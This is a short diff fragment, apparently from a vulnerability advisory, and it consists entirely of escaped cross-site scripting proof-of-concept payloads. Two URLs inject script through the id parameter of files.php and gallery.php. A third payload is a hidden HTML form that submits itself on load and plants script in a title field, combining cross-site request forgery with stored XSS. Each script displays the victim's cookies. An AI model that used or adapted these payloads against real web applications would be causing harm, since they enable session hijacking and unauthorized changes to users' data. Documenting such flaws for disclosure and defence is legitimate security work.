@@ -1,0 +1,11 @@
+1. http://host/files.php?action=edit&amp;id=999&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+2. http://host/gallery.php?action=view&amp;id=999&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+3. &lt;form action=&quot;http://host/files.php?action=edit&amp;id=2&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;data[title]&quot; value=&#039;title&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;data[tags]&quot; value=&#039;tag&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
